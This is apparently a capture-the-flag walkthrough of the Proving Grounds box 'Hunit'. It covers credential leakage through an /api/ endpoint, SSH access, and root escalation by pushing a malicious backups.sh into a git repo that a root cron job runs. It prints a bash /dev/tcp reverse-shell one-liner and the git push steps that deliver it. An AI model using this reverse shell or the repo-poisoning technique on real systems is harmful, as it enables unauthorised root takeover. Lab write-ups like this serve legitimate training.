# Hunit — Proving Grounds

> [!abstract] Summary
> Hunit serves a "Whack A Mole" web app on port **18030**. Its hidden **`/api/`** (note the trailing slash) exposes a user-listing endpoint; one account stands out and leaks the credential **`dademola : ExplainSlowQuest110`**. That logs in over SSH on the non-standard port **43022**. Local enumeration finds a `git` account with a git-shell and a root-owned **`/git-server`** bare repository that a cron/backup job (running as root) interacts with. Cloning the repo, adding a malicious `backups.sh` reverse shell, and **pushing** it causes the root backup job to execute the script — yielding a root shell.

**Target:** `192.168.142.125`

## Methodology

1. Scan all TCP ports; identify Tomcat (8080), SMB (12445), the Whack-A-Mole app (18030), and SSH (43022).
2. Enumerate the 18030 web app's `/api/` endpoint and recover a user credential.
3. SSH in as `dademola` on port 43022.
4. Find the `git` user and root-owned `/git-server` repo + root backup job.
5. Push a malicious `backups.sh` into the repo to get executed as root.

## Web enumeration — the `/api/` user listing (port 18030)

Browse `http://192.168.142.125:18030/` — a "Whack A Mole" game. The interesting part is its API. The directory only responds **with the trailing slash**:

```
# /api  -> not found ;  /api/ -> works
curl http://192.168.142.125:18030/api/
```

> [!tip] Learning note — trailing slash matters
> Many frameworks route `/api/` and `/api` differently; a brute-forcer that only tried `/api` would miss this. Always test both forms.

The API exposes a **user listing** endpoint (e.g. `/api/user/`). Among the returned accounts one "looks different than the others" — **`dademola`** — and it leaks a credential:

```
dademola : ExplainSlowQuest110
```

## Initial access — SSH on port 43022

```
ssh dademola@192.168.142.125 -p43022
```

This lands in `/home/dademola` with `local.txt`. (The normal web server wasn't reachable in some positions; port 43022 also fronts content, and `scp -P 43022` is used to push tooling like `linpeas.sh`.)

```
scp -P 43022 linpeas.sh dademola@192.168.142.125:/home/dademola
```

## Local enumeration — the git user and /git-server

Enumerating users and the filesystem reveals:
- A **`git`** user (with a `git-shell` login) and a `git-shell-commands` directory — `git-shell` only allows git operations, not arbitrary commands.
- A root-owned **`/git-server`** bare repository (not directly readable).
- A **cron/backup job** running as root that operates on the git repo (easy to miss — it only surfaced in the full LinPEAS output).

## Privilege escalation — malicious push → root backup job

> [!info] The idea
> The root backup job pulls/checks out from `/git-server` and runs a `backups.sh` that lives in the repo. If we can commit our own `backups.sh` (a reverse shell) and push it, the next time the root job runs it executes **our** script as root.

### Step 1 — Clone the repo from `dademola`'s home

```
cd /home/dademola
git clone file:///git-server/
```

`git log` works inside the cloned working copy (even though `/git-server` itself is unreadable directly).

### Step 2 — Add a malicious `backups.sh`

Create `backups.sh` containing a reverse shell (callback to your Kali IP/port), then commit it. Git may first demand an identity:

```
git config user.name "x"
git config user.email "x@x"

# backups.sh = a reverse shell, e.g.:
#   #!/bin/bash
#   bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1

git add backups.sh
git commit -m "update"
```

### Step 3 — Push over SSH with the git key

The push goes back to the server as the `git` user over port 43022 (using the git SSH key found during enumeration):

```
GIT_SSH_COMMAND='ssh -i git.ssh -p 43022 -o IdentitiesOnly=yes' git push -u origin
```

Start a listener (`nc -lvnp <PORT>`) and wait. When the root backup job next runs, it executes the pushed `backups.sh` as root and the reverse shell returns with `uid=0`. Read `/root/proof.txt`.

## Lessons learned

- Test both `/api` and `/api/` — trailing-slash routing differences hide endpoints from naive fuzzing. The user-listing API here handed over `dademola`'s credential.
- Non-standard SSH ports (43022) are normal on PG — scan all ports and don't assume 22.
- Read LinPEAS output **in full**; the root backup cron was the single line that made the box solvable and is easy to scroll past.
- A writable/pushable git repo that a privileged job builds or runs is a code-execution-as-root primitive: commit a payload, push, let the root job run it. (Same idea as git hooks / CI running your committed code.)
- `git-shell` restricts interactive use but still permits push/pull — enough to deliver the payload.
